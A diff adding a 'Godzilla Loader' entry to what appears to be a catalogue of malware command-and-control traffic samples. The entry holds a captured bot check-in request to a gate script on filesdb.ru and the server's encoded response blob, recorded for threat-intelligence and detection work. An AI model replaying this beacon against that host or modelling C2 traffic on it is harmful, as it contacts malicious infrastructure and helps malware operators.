@@ -378,6 +378,34 @@ Accept-Encoding: gzip
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-1.png "Glupteba")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-2.png "Glupteba")
 
+#### Godzilla Loader
+~~~
+GET /gate16.php?g=-994429369&k=7NLp9MrFuKWnfhYAmxKEcsWO2 HTTP/1.1
+Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+Accept-Language: en-US
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: filesdb.ru
+Connection: Keep-Alive
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sat, 01 Sep 2018 12:12:58 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Keep-Alive: timeout=60
+Set-Cookie: PHPSESSID=btq14ialn2bbefrsvedfspt9s4; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Encoding: gzip
+
+<div id="s">IKqglmKsWN8CSCWpwIItt6O/sFpxceFdZPucGXeeUi1CbtjgXllqiSnOcsojWNxNP8ySG4XsKU94bKJh2vFSAtqb+g939WslRHMzKsr2YaDwN51PG9a/CZ/BVaK3Idznf3tkNJAy9+6r6vj/9spjxPp1+pqK3DrdVr7uJG0xkSv8Ez7fmCPgc4YrHpSk2cMvODT9bbv1eNE4zjGd+N4t3Lhp/+k48QWtGIQ48A6Q9HzhWO1L4SpVawEVg/hbN+EJSCVhQCIljVpvrcyeY6w1yX9QT5TSZosQlbzog3mLceYYz1teNlHwhGToXVDb9ACyxlo/FrdlapR/R0jCx0F+OQ==</div>
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/godzilla.png "Godzilla Loader")
+
+
 #### Hancitor
 ~~~
 POST /4/forum.php HTTP/1.1
